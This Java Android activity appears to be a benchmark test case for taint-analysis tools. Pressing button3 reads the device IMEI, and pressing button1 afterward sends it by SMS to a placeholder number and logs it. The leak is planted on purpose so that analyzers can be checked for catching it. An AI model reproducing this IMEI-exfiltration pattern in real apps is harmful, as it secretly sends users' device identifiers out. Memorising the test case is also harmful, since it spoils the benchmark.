package de.ecspride;

import android.app.Activity;
import android.content.Context;
import android.os.Bundle;
import android.telephony.SmsManager;
import android.telephony.TelephonyManager;
import android.util.Log;
import android.view.View;
import android.widget.Button;

/**
 * This app contains the following challenges:
 * 	- Ability to check Listeners
 *  - Ability to know that the callback of button3 is clickOnButton3 (XML-file)
 *  - There is only one data leak iff first button3 and then button1 is pressed!
 *  
 * @author Siegfried Rasthofer
 */
public class Button2 extends Activity {
	private String imei = null;
	
    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_button2);
        
        Button button1= (Button) findViewById(R.id.button1);
		button1.setOnClickListener(new View.OnClickListener() {
		    @Override
		    public void onClick(View v) {
		    	
		    	SmsManager sm = SmsManager.getDefault();
		    	String number = "+49 1234";
		    	sm.sendTextMessage(number, null, imei, null, null);
		        Log.i("TAG", "sendIMEI: " + imei);
		        
		        imei = null;
		    }
		});
		
		
		Button button2= (Button) findViewById(R.id.button2);
		button2.setOnClickListener(new View.OnClickListener() {
		    @Override
		    public void onClick(View v) {
		        imei = null;
		        Log.i("TAG", "Button 2: " + imei);
		    }
		});
    }

    public void clickOnButton3(View view){
		TelephonyManager telephonyManager = (TelephonyManager)getSystemService(Context.TELEPHONY_SERVICE);
		imei = telephonyManager.getDeviceId();
		Log.i("TAG", "Button3: " + imei);
	}
}
